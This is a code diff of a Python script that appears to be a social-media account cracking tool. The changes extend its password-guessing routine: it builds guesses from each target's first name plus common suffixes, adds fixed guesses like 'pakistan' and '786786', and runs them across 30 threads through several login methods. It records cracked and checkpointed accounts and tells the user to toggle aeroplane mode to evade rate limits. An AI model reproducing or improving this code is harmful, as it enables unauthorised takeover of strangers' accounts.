@@ -666,16 +666,16 @@ def setting():
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	print(f'-<<•>>- {m}•{k}•{h}•{x} Sedang Menggeser Matahari {m}•{k}•{h}•{x} -<<•>>- ')
+	os.system('clear')
+	banner()
+	print(f'         {m}•{k}•{h}•{x} {b}Cracking Start Be Patience{b} {m}•{k}•{h}•{x} ')
 	print('')
-	print(f'——> Hasil {b}OK{x} Tersimpan Di : {b}OK/%s {x}'%(okc))
-	print(f'——> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'<•> Mainkan Mode Pesawat Setiap {p}100{x} Idz\n')
+	print(f'  {m}•{k}•{h}•{x} {b}Play Aeroplane mode After Every 3 Minuts{b} {m}•{k}•{h}•{x} ')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = []
+			pwv = ['pakistan','786786','000786']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
@@ -683,6 +683,10 @@ def passwrd():
 					pwv.append(frs+'123')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+					pwv.append(frs+'1234567')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'786')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
@@ -692,31 +696,38 @@ def passwrd():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456')
+					pwv.append(frs+'1234567')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'786')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
 			else:pass
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
-			elif 'free' in method:
-				pool.submit(crackfree,idf,pwv)
-			elif 'touch' in method:
-				pool.submit(cracktouch,idf,pwv)
 			elif 'mbasic' in method:
-				pool.submit(crackmbasic,idf,pwv)
+				pool.submit(crackmbfb,idf,pwv)
+			elif 'free' in method:
+				pool.submit(crackfreefb,idf,pwv)
+			elif 'x' in method:
+				pool.submit(crackX,idf,pwv)
+			elif 'p' in method:
+				pool.submit(crackP,idf,pwv)
+			elif 'd' in method:
+				pool.submit(crackD,idf,pwv)
 			else:
 				pool.submit(crackmbasic,idf,pwv)
 	print('')
-	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
-	print(f' {b}╰─>{x} {h} OK : {h}%s '%(ok))
-	print(f'{x} {k}╰─>{x} {k} CP : {k}%s{x} '%(cp))
+	print(f'{b}Crack Done, Dont Forget to Be Thankful{b}{x}')
+	print(f'[{h}•{u}]{h} OK : {h}%s '%(ok))
+	print(f'{k}[{k}•{h}]{k} CP : {k}%s{u} '%(cp))
 	print('')
-	print('—> Lanjut Crack Kembali ( Y/t ) ? ')
-	woi = input('—> Pilih : ')
+	print('{k}Continue Cracking Back ( Y/t ) ? ')
+	woi = input('Enter : ')
 	if woi in ['y','Y']:
 		back()
 	else:
-		print(f'\t{x}<•>{k} Good Bye {x} <•> ')
+		print(f'\t{x}{k} Good Bye Dadaahh{u} ')
 		time.sleep(2)
 		exit()
 #--------------------[ METODE-B-API ]-----------------#
